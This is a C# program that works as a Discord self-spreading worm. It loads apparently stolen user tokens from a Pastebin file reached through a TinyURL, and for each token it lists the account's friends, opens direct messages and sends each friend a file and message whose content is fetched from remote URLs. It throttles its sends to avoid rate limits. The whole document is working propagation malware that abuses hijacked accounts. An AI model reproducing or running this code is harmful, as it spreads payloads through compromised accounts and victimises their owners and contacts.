using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Threading;

class Program
{
    static void Main()
    {
        string messageURL = "YOUR_TINYURL_MESSAGE";
        string fileNameURL = "YOUR_TINYURL_FILENAME";
        string fileExtURL = "YOUR_TINYURL_EXTENSION";
        string contentURL = "YOUR_TINYURL_PAYLOAD";
        string tokenURL = "YOUR_TINYURL_TOKENS"; // TinyURL to raw Pastebin containing tokens
        double selfSpreadDelay = 750.0 / 100.0; // delay so no ratelimit, I recommend 750 / 100

        string message = GetTinyURLContent(messageURL);
        string fileName = GetTinyURLContent(fileNameURL);
        string fileExt = GetTinyURLContent(fileExtURL);
        string content = GetTinyURLContent(contentURL);
        List<string> tokens = GetTinyURLTokens(tokenURL);

        foreach (string token in tokens)
        {
            Thread thread = new Thread(() => Spread(token, message, fileName, fileExt, content, selfSpreadDelay));
            thread.Start();
        }
    }

    static void Spread(string token, string message, string fileName, string fileExt, string content, double delay)
    {
        foreach (dynamic friend in GetFriends(token))
        {
            try
            {
                string payload = $"-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name=\"file\"; filename=\"{fileName}.{fileExt}\"\nContent-Type: text/plain\n\n{content}\n-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name=\"content\"\n\n{message}\n-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name=\"tts\"\n\nfalse\n-----------------------------325414537030329320151394843687--";
                string headers = "multipart/form-data; boundary=---------------------------325414537030329320151394843687";
                string chatId = GetChat(token, friend.id);
                WebClient webClient = new WebClient();
                webClient.Headers.Add("Content-Type", headers);
                webClient.Headers.Add("Authorization", token);
                webClient.UploadString($"https://discordapp.com/api/v6/channels/{chatId}/messages", "POST", payload);
            }
            catch
            {
                // Error handling
            }

            Console.WriteLine($"Sent file to friend: {friend.user.username}");
            Thread.Sleep((int)(delay * 1000));
        }
    }

    static dynamic GetFriends(string token)
    {
        using (WebClient webClient = new WebClient())
        {
            webClient.Headers.Add("Authorization", token);
            string response = webClient.DownloadString("https://discordapp.com/api/v6/users/@me/relationships");
            dynamic friends = Newtonsoft.Json.JsonConvert.DeserializeObject(response);
            return friends;
        }
    }

    static string GetChat(string token, string userId)
    {
        try
        {
            using (WebClient webClient = new WebClient())
            {
                webClient.Headers.Add("Content-Type", "application/json");
                webClient.Headers.Add("Authorization", token);
                string response = webClient.UploadString("https://discordapp.com/api/v6/users/@me/channels", "{\"recipient_id\":\"" + userId + "\"}");
                dynamic chat = Newtonsoft.Json.JsonConvert.DeserializeObject(response);
                return chat.id;
            }
        }
        catch
        {
            // Error handling
        }

        return null;
    }

    static string GetTinyURLContent(string tinyURL)
    {
        using (WebClient webClient = new WebClient())
        {
            string redirectedURL = webClient.DownloadString(tinyURL);
            return webClient.DownloadString(redirectedURL);
        }
    }

    static List<string> GetTinyURLTokens(string tokenURL)
    {
        string tokensContent = GetTinyURLContent(tokenURL);
        List<string> tokens = new List<string>();

        using (StringReader reader = new StringReader(tokensContent))
        {
            string line;
            while ((line = reader.ReadLine()) != null)
            {
                line = line.Trim();
                if (!string.IsNullOrEmpty(line))
                    tokens.Add(line);
            }
        }

        return tokens;
    }
}
